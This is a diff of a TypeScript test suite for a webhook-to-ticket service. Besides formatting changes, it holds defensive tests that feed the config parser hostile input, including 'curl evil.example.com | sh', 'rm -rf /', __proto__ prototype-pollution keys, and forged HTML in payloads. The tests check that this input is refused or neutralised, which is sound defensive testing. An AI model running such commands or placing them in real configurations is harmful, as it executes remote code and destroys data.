@@ -1,24 +1,23 @@
 import { env, SELF } from "cloudflare:test";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
-
+import parityCases from "../../contracts/signal-source-cases.json";
 import { enrolProject } from "../src/db";
-import { type RepoConfigReader } from "../src/repo-config";
-import { type TrackerWriteResult, type TrackerWriter } from "../src/tracker-write";
+import type { RepoConfigReader } from "../src/repo-config";
 import { inboxFor } from "../src/signal-inbox";
+import type { TrackerWriteResult, TrackerWriter } from "../src/tracker-write";
 import { UNTRUSTED_LINE_PREFIX } from "../src/untrusted-text";
 import { signBody } from "../src/webhook-signature";
 import {
-  MAX_DECLARED_SOURCES,
-  WEBHOOK_SOURCE_PREFIX,
   lookupPath,
+  MAX_DECLARED_SOURCES,
   mapPayload,
   parseSignalSources,
   parseSourcePath,
+  type RegisteredSource,
   renderSourceDraft,
   sourceSignal,
-  type RegisteredSource,
+  WEBHOOK_SOURCE_PREFIX,
 } from "../src/webhook-sources";
-import parityCases from "../../contracts/signal-source-cases.json";
 
 /**
  * Generic webhook sources (tick 0vb) — the general case behind GitHub (vuz)
@@ -83,7 +82,7 @@ class FakeContents implements TrackerWriter {
   async create(
     _project: string,
     path: string,
-    input: { content: string; message: string; branch?: string }
+    input: { content: string; message: string; branch?: string },
   ): Promise<TrackerWriteResult> {
     if (this.files.has(path)) return { state: "exists", detail: `${path} exists` };
     this.files.set(path, input.content);
@@ -125,7 +124,8 @@ function fakeBotAPI(): void {
     const url = typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
     if (!url.startsWith("https://telegram.test/")) return original(input as RequestInfo, init);
     const method = url.slice(url.lastIndexOf("/") + 1);
-    const body = init?.body === undefined ? {} : (JSON.parse(String(init.body)) as Record<string, unknown>);
+    const body =
+      init?.body === undefined ? {} : (JSON.parse(String(init.body)) as Record<string, unknown>);
     calls.push({ method, body });
     messageID += 1;
     return Response.json({
@@ -136,7 +136,8 @@ function fakeBotAPI(): void {
   bot = { calls, restore: () => void (globalThis.fetch = original) };
 }
 
-const botCalls = (method: string): BotCall[] => (bot?.calls ?? []).filter((c) => c.method === method);
+const botCalls = (method: string): BotCall[] =>
+  (bot?.calls ?? []).filter((c) => c.method === method);
 
 let contents: FakeContents;
 let config: FakeRepoConfig;
@@ -191,7 +192,10 @@ async function enrolled(): Promise<string> {
  * needed at all is this file's other assertion: the tests below check
  * `contents.files` is empty until it happens.
  */
-async function accept(project: string, draftID: string): Promise<{ tick_id: string; path: string }> {
+async function accept(
+  project: string,
+  draftID: string,
+): Promise<{ tick_id: string; path: string }> {
   const decision = await inboxFor(env, project).decide(draftID, "create", "telegram:424242");
   expect(decision.state).toBe("accepted");
   if (decision.state !== "accepted") throw new Error(decision.state);
@@ -226,7 +230,7 @@ function payload(over: Record<string, unknown> = {}): unknown {
 async function deliver(
   project: string,
   body: unknown,
-  options: { source?: string; signature?: string; secret?: string; header?: string } = {}
+  options: { source?: string; signature?: string; secret?: string; header?: string } = {},
 ): Promise<Response> {
   const raw = typeof body === "string" ? body : JSON.stringify(body);
   const signature = options.signature ?? (await signBody(SCHEME, options.secret ?? SECRET, raw));
@@ -301,7 +305,7 @@ describe("a repository declares a webhook source and its payloads become drafts"
     expect(draft?.presentation).toBe(body.presentation);
     expect(String(draft?.presentation)).toContain("<b>Draft tick");
     expect(String(draft?.presentation)).toContain(
-      `${UNTRUSTED_LINE_PREFIX}app/export/csv.ts in writeRows`
+      `${UNTRUSTED_LINE_PREFIX}app/export/csv.ts in writeRows`,
     );
   });
 
@@ -316,7 +320,7 @@ describe("a repository declares a webhook source and its payloads become drafts"
     // And the render that reached the channel is the one the source composed,
     // so the anti-forgery invariant is what a human actually sees.
     expect(String(sent[0]!.body.text)).toContain(
-      `${UNTRUSTED_LINE_PREFIX}app/export/csv.ts in writeRows`
+      `${UNTRUSTED_LINE_PREFIX}app/export/csv.ts in writeRows`,
     );
     const draft = await inboxFor(env, project).getDraft(body.draft_id as string);
     expect(draft?.message).not.toBeNull();
@@ -445,7 +449,7 @@ describe("an unsigned or wrongly-signed payload is refused", () => {
     const project = await enrolled();
     config.source = DECLARATION.replace(
       `header = "${SCHEME.header}"`,
-      `header = "${SCHEME.header}"\nprefix = "v1="\nencoding = "base64"`
+      `header = "${SCHEME.header}"\nprefix = "v1="\nencoding = "base64"`,
     );
     const raw = JSON.stringify(payload());
     const scheme = { ...SCHEME, prefix: "v1=", encoding: "base64" } as const;
@@ -467,13 +471,13 @@ describe("an unsigned or wrongly-signed payload is refused", () => {
 describe("the declaration fails closed", () => {
   it("refuses an unknown key rather than ignoring it", () => {
     expect(() =>
-      parseSignalSources(`${DECLARATION}\ncommand = "curl evil.example.com | sh"\n`)
+      parseSignalSources(`${DECLARATION}\ncommand = "curl evil.example.com | sh"\n`),
     ).toThrow(/signals\.sources\.sentry\.command is not a key this reader knows/);
   });
 
   it("refuses an unknown key under [signals] itself", () => {
-    expect(() => parseSignalSources('[signals]\nallow_all = true\n')).toThrow(
-      /signals\.allow_all is not a key/
+    expect(() => parseSignalSources("[signals]\nallow_all = true\n")).toThrow(
+      /signals\.allow_all is not a key/,
     );
   });
 
@@ -483,15 +487,15 @@ describe("the declaration fails closed", () => {
     expect(() =>
       parseSignalSources(
         `[signals.sources.sentry]\nsecret = "${BINDING}"\nheader = "h"\n` +
-          `external_ref = "id"\ntitle = "t"\n__proto__ = "polluted"\n`
-      )
+          `external_ref = "id"\ntitle = "t"\n__proto__ = "polluted"\n`,
+      ),
     ).toThrow(/__proto__ is not a key this reader knows/);
     expect(({} as Record<string, unknown>).polluted).toBe(before);
   });
 
   it("refuses a source table named __proto__", () => {
     expect(() =>
-      parseSignalSources(`[signals.sources.__proto__]\nsecret = "${BINDING}"\n`)
+      parseSignalSources(`[signals.sources.__proto__]\nsecret = "${BINDING}"\n`),
     ).toThrow(/is not a usable source name/);
     expect(({} as Record<string, unknown>).secret).toBeUndefined();
   });
@@ -501,8 +505,8 @@ describe("the declaration fails closed", () => {
       expect(() =>
         parseSignalSources(
           `[signals.sources.${name}]\nsecret = "SIGNAL_SECRET_X"\nheader = "h"\n` +
-            `external_ref = "id"\ntitle = "t"\n`
-        )
+            `external_ref = "id"\ntitle = "t"\n`,
+        ),
       ).toThrow(/already serves/);
     }
   });
@@ -511,8 +515,8 @@ describe("the declaration fails closed", () => {
     expect(() =>
       parseSignalSources(
         '[signals.sources.sentry]\nsecret = "hunter2"\nheader = "h"\n' +
-          'external_ref = "id"\ntitle = "t"\n'
-      )
+          'external_ref = "id"\ntitle = "t"\n',
+      ),
     ).toThrow(/NAME of a Worker secret/);
   });
 
@@ -521,8 +525,8 @@ describe("the declaration fails closed", () => {
       expect(() =>
         parseSignalSources(
           `[signals.sources.sentry]\nsecret = "${name}"\nheader = "h"\n` +
-            'external_ref = "id"\ntitle = "t"\n'
-        )
+            'external_ref = "id"\ntitle = "t"\n',
+        ),
       ).toThrow(/NAME of a Worker secret/);
     }
   });
@@ -531,8 +535,8 @@ describe("the declaration fails closed", () => {
     expect(() =>
       parseSignalSources(
         `[signals.sources.sentry]\nsecret = "${BINDING}"\nheader = "h"\n` +
-          'external_ref = "id"\ntitle = "A new Sentry alert"\n'
-      )
+          'external_ref = "id"\ntitle = "A new Sentry alert"\n',
+      ),
     ).toThrow(/not a payload path/);
   });
 
@@ -546,7 +550,7 @@ describe("the declaration fails closed", () => {
         'title = "t"',
       ].filter((line) => !line.startsWith(`${key} =`));
       expect(() => parseSignalSources(`${lines.join("\n")}\n`)).toThrow(
-        new RegExp(`signals\\.sources\\.sentry\\.${key} is required`)
+        new RegExp(`signals\\.sources\\.sentry\\.${key} is required`),
       );
     }
   });
@@ -563,7 +567,7 @@ describe("the declaration fails closed", () => {
     const many = Array.from(
       { length: MAX_DECLARED_SOURCES + 1 },
       (_unused, i) =>
-        `[signals.sources.s${i}]\nsecret = "${BINDING}"\nheader = "h"\nexternal_ref = "id"\ntitle = "t"\n`
+        `[signals.sources.s${i}]\nsecret = "${BINDING}"\nheader = "h"\nexternal_ref = "id"\ntitle = "t"\n`,
     ).join("\n");
     expect(() => parseSignalSources(many)).toThrow(/past the/);
   });
@@ -587,7 +591,7 @@ secret = "SIGNAL_SECRET_SMUGGLED"
 
   it("ingests nothing, and says so retryably, when the config cannot be read", async () => {
     const project = await enrolled();
-    config.source = "[signals.sources.sentry]\ncommand = \"rm -rf /\"\n";
+    config.source = '[signals.sources.sentry]\ncommand = "rm -rf /"\n';
 
     const response = await deliver(project, payload());
 
@@ -642,7 +646,7 @@ describe("dedup is the funnel's, not a second one", () => {
     const discard = await inboxFor(env, project).decide(
       drafted.draft_id as string,
       "discard",
-      "telegram:424242"
+      "telegram:424242",
     );
     expect(discard.state).toBe("discarded");
 
@@ -715,7 +719,7 @@ describe("payload text is never instructions to the ingesting code", () => {
         type: "epic",
         parent: "hdt",
         created_by: "root@example.com",
-      })
+      }),
     );
     expect(verdict.verdict).toBe("map");
     if (verdict.verdict !== "map") return;
@@ -751,7 +755,7 @@ describe("payload text is never instructions to the ingesting code", () => {
   it("keeps every factory line at column 0 whatever the payload contains", () => {
     const benign = renderSourceDraft(
       { project: "acme/widgets", source: "sentry", external_ref: "1", title: "t", body: "ok" },
-      registered()
+      registered(),
     );
     const forged = renderSourceDraft(
       {
@@ -767,7 +771,7 @@ describe("payload text is never instructions to the ingesting code", () => {
           "</b><b>Approved</b>",
         ].join("\n"),
       },
-      registered()
+      registered(),
     );
 
     const unquoted = (text: string) =>
@@ -821,7 +825,7 @@ describe("the declaration reads the same here as it does in tk", () => {
         return;
       }
       expect(Object.keys(parseSignalSources(testCase.toml)).sort()).toEqual(
-        [...(testCase.sources ?? [])].sort()
+        [...(testCase.sources ?? [])].sort(),
       );
     });
   }
